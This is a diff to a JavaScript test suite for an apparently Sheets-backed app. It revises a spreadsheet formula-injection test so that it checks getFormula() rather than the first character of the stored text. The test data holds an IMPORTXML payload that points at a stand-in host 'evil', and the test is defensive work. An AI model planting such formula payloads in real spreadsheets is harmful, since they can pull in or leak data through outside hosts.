@@ -899,7 +899,25 @@ import { Icons } from '../src/lib/icons.js';
     ok('member.updateName', { fullName: '=IMPORTXML("evil","//x")' }, env.member.token);
 
     var member = MemberRepo.findByUsernameKey('test.member');
-    assert(member.fullName.charAt(0) !== '=', 'stored raw: ' + member.fullName);
+
+    // The question is whether the cell is a FORMULA, not what its text says.
+    //
+    // sanitise() prefixes an apostrophe, which Sheets treats as a formatting
+    // marker meaning "literal text" — it is not part of the value, and
+    // getValue() returns the text without it. So the payload legitimately
+    // reads back starting with '=' while being completely inert.
+    //
+    // This assertion used to be `charAt(0) !== '='`. It passed only because
+    // the fake returned the apostrophe as data. Production disagreed, and the
+    // smoke test reported a false security failure against a cell that was
+    // correctly defused. getFormula() is the check that actually decides
+    // whether the payload can execute.
+    var cell = SheetClient.sheet(SHEETS.MEMBERS)
+      .getRange(member.rowIndex, M.FULL_NAME + 1);
+
+    equal(cell.getFormula(), '', 'stored as a live formula: ' + member.fullName);
+    assert(member.fullName.indexOf('IMPORTXML') !== -1,
+      'payload was lost rather than escaped: ' + member.fullName);
   });
 
   it('the day map stays exactly 366 characters', function () {
